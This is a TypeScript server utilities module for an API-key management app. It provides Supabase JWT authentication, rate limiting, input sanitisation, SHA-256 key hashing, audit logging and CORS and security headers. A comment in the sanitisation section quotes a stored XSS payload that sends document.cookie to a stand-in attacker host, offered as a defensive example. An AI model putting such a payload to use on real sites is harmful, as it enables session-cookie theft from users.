import { createClient } from '@supabase/supabase-js';
import * as crypto from 'crypto';
import type { IncomingMessage, ServerResponse } from 'http';

// ── Vercel Serverless Function Types ─────────────────────────────────────────
export interface VercelRequest extends IncomingMessage {
  query: Record<string, string | string[]>;
  cookies: Record<string, string>;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  body: any; // Vercel parses the JSON body at runtime — typed loosely by design
  method?: string;
}

export interface VercelResponse extends ServerResponse {
  status: (statusCode: number) => VercelResponse;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  json: (jsonBody: any) => VercelResponse;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  send: (body: any) => VercelResponse;
}

// ── Authenticated Actor Context ───────────────────────────────────────────────
/**
 * Resolved from the Bearer JWT on every authenticated request.
 * Used to scope database queries to the user's org and populate audit logs
 * with real identity rather than hardcoded placeholder values.
 */
export interface AuthContext {
  userId: string;
  email: string;
  name: string;
  /** The Supabase UUID of the organization this user belongs to. */
  orgId: string;
}

// ── Environment Configuration ────────────────────────────────────────────────
let supabaseUrl = process.env.VITE_SUPABASE_URL || '';
if (supabaseUrl && !supabaseUrl.includes('://')) {
  supabaseUrl = `https://${supabaseUrl}.supabase.co`;
}
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY || '';

/** True when real Supabase credentials are present. False in dev/demo mode. */
export const isLiveMode = !!(supabaseUrl && supabaseServiceKey);

/**
 * Server-side Supabase client using the SERVICE_ROLE_KEY.
 * This key bypasses Row Level Security — ALL queries must be manually
 * scoped to the authenticated user's orgId. Never expose this key to the browser.
 */
export const supabase = isLiveMode
  ? createClient(supabaseUrl, supabaseServiceKey, {
      auth: { persistSession: false }
    })
  : null;

// ── Typed Mock Data Store (dev / demo mode) ───────────────────────────────────
export interface MockProject {
  id: string | number;
  name: string;
  environment: string;
  description: string;
  keys: number;
  calls: string;
  status: string;
  updated: string;
  icon: string;
  color: string;
}

export interface MockKey {
  id: string | number;
  name: string;
  key: string;
  project_id: string;
  scope: string;
  expiry: string;
  status: 'Active' | 'Disabled' | 'Revoked';
  created: string;
}

export interface MockMember {
  id: string | number;
  name: string;
  email: string;
  role: string;
  avatar: string;
  joined: string;
  status: 'Active' | 'Invited';
  keys: number;
}

export interface MockAudit {
  id: string | number;
  action: string;
  category: string;
  actorName: string;
  actorEmail: string;
  target: string;
  ip: string;
  location: string;
  timestamp: string;
  severity: 'Success' | 'Warning' | 'Revocation';
}

export interface MockDataStore {
  projects: MockProject[];
  keys: MockKey[];
  team: MockMember[];
  audits: MockAudit[];
}

// Persist across warm serverless invocations using the global scope
const globalRef = globalThis as Record<string, unknown>;
if (!globalRef['mockStore']) {
  globalRef['mockStore'] = { projects: [], keys: [], team: [], audits: [] };
}
export const mockStore = globalRef['mockStore'] as MockDataStore;

// ── Authentication Middleware ─────────────────────────────────────────────────
/**
 * WHY: Every API endpoint was previously open to anonymous access — any user
 * knowing the URL could read, write, or delete any team's data. This function
 * enforces authentication on every serverless route.
 *
 * HOW: Reads the `Authorization: Bearer <supabase_jwt>` header sent by the
 * frontend, verifies it with Supabase Auth (auth.getUser), then resolves the
 * user's org membership so queries can be tenant-scoped.
 *
 * DEV MODE: When Supabase is not configured (VITE_SUPABASE_URL not set), returns
 * a synthetic dev context so local development still works without credentials.
 */
export async function requireAuth(
  req: VercelRequest,
  res: VercelResponse
): Promise<AuthContext | null> {
  // Dev / demo mode — skip real auth, return synthetic identity
  if (!isLiveMode || !supabase) {
    return {
      userId: 'dev-user-id',
      email: 'dev@keyforge.local',
      name: 'Developer (Demo)',
      orgId: 'dev-org-id',
    };
  }

  const authHeader = req.headers['authorization'] as string | undefined;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    res.status(401).json({ error: 'Authentication required. Please sign in to continue.' });
    return null;
  }

  const token = authHeader.slice(7);
  const { data: { user }, error } = await supabase.auth.getUser(token);

  if (error || !user) {
    res.status(401).json({ error: 'Session expired or invalid. Please sign in again.' });
    return null;
  }

  // Resolve which org this user belongs to via team_members lookup
  const { data: memberRow } = await supabase
    .from('team_members')
    .select('org_id, name')
    .eq('email', user.email ?? '')
    .maybeSingle();

  const orgId = memberRow?.org_id as string | undefined
    ?? '00000000-0000-0000-0000-000000000000';

  const name: string =
    (memberRow?.name as string | undefined) ??
    (user.user_metadata?.full_name as string | undefined) ??
    (user.user_metadata?.name as string | undefined) ??
    user.email?.split('@')[0] ??
    'Unknown User';

  return { userId: user.id, email: user.email ?? '', name, orgId };
}

// ── Rate Limiting ─────────────────────────────────────────────────────────────
/**
 * WHY: Without rate limits, attackers can brute-force the key validation endpoint,
 * spam-create keys, or trigger denial-of-service against the Supabase quota.
 *
 * NOTE: In-memory — resets on cold starts. For production at scale, replace the
 * Map with Upstash Redis (compatible with Vercel Edge / Serverless).
 *
 * Returns true when the request should be BLOCKED (limit exceeded).
 */
interface RateLimitEntry { count: number; resetAt: number }
const rateLimitStore = new Map<string, RateLimitEntry>();

export function checkRateLimit(
  key: string,
  maxRequests = 60,
  windowMs = 60_000
): boolean {
  const now = Date.now();
  const entry = rateLimitStore.get(key);

  if (!entry || now > entry.resetAt) {
    rateLimitStore.set(key, { count: 1, resetAt: now + windowMs });
    return false; // first request in window — allow
  }

  entry.count += 1;
  return entry.count > maxRequests; // true = blocked
}

// ── Input Sanitization ────────────────────────────────────────────────────────
/**
 * WHY: User-supplied strings (key names, project descriptions, email addresses)
 * were written to the DB without validation. A stored XSS payload like
 * <script>fetch('evil.com?k='+document.cookie)</script> as a key name would be
 * persisted and potentially rendered in logs, CSV exports, or future integrations.
 *
 * sanitizeText strips HTML-dangerous characters and enforces a length cap.
 * isValidEmail prevents obviously malformed emails being stored as actor targets.
 */
export function sanitizeText(input: string, maxLength = 255): string {
  return String(input)
    .replace(/[<>"'`\\]/g, '') // strip HTML/JS-injection chars
    .trim()
    .slice(0, maxLength);
}

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
export function isValidEmail(email: string): boolean {
  return EMAIL_RE.test(email) && email.length <= 320;
}

// ── Cryptographic Key Generation ──────────────────────────────────────────────
/**
 * hashApiKey: SHA-256 of the raw key. Used for DB storage — the raw secret
 * is NEVER stored. During validation, the candidate key is hashed and compared.
 */
export function hashApiKey(rawKey: string): string {
  return crypto.createHash('sha256').update(rawKey).digest('hex');
}

/**
 * generateApiKey: Produces a cryptographically secure API key triple:
 *   raw    — the plaintext secret shown to the user exactly once
 *   prefix — first 12 chars, safe to show in UIs and logs (e.g. "sk_live_abcd")
 *   hash   — SHA-256 digest stored in the database
 */
export function generateApiKey(): { raw: string; prefix: string; hash: string } {
  const token = crypto.randomBytes(24).toString('hex'); // 192 bits of entropy
  const raw = `sk_live_${token}`;
  const prefix = raw.slice(0, 12);
  const hash = hashApiKey(raw);
  return { raw, prefix, hash };
}

// ── Audit Log Writer ──────────────────────────────────────────────────────────
/**
 * WHY: All 20+ audit log calls previously hardcoded actorName = 'DevMaster_01'.
 * This made the audit trail forensically worthless — indistinguishable across users.
 * Now every caller passes the real AuthContext so real identity is recorded.
 */
export async function writeAuditLog(params: {
  orgId?: string;
  action: string;
  category: string;
  target: string;
  actorName: string;
  actorEmail: string;
  ipAddress: string;
  location: string;
  severity?: 'Success' | 'Warning' | 'Revocation';
}): Promise<void> {
  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';

  if (isLiveMode && supabase) {
    await supabase.from('audit_logs').insert([{
      org_id: params.orgId || '00000000-0000-0000-0000-000000000000',
      action: params.action,
      category: params.category,
      target: params.target,
      actor_name: params.actorName,
      actor_email: params.actorEmail,
      ip_address: params.ipAddress,
      location: params.location,
      severity: params.severity || 'Success'
    }]);
  } else {
    mockStore.audits.unshift({
      id: Date.now(),
      action: params.action,
      category: params.category,
      actorName: params.actorName,
      actorEmail: params.actorEmail,
      target: params.target,
      ip: params.ipAddress,
      location: params.location,
      timestamp,
      severity: params.severity || 'Success'
    });
  }
}

// ── CORS + Security Headers ───────────────────────────────────────────────────
const ALLOWED_ORIGINS = [
  'https://key-forge-five.vercel.app',
  'http://localhost:5173',
  'http://localhost:4173',
];

export function enableCors(req: VercelRequest, res: VercelResponse): boolean {
  const origin = (req.headers['origin'] as string) || '';
  const allowedOrigin = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];

  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, Authorization'
  );
  res.setHeader('Vary', 'Origin');

  // Security hardening headers
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';"
  );
  // Remove server-identifying header to reduce attack surface fingerprinting
  res.removeHeader('X-Powered-By');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return true;
  }
  return false;
}

/** Always returns a generic message to the client — never internal details or stack traces. */
export function safeError(res: VercelResponse, statusCode: number, clientMessage: string): VercelResponse {
  return res.status(statusCode).json({ error: clientMessage });
}
